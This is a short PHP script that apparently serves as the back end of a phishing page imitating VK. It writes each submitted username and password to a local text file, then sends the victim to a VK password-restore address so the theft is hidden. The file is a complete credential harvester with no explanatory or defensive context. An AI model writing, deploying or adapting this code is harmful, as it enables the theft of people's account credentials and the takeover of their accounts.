<?php
file_put_contents("usernames.txt", "Vk Username: " . $_POST['login'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://vk.com/restore/
header("Location: $url");
exit();
?>
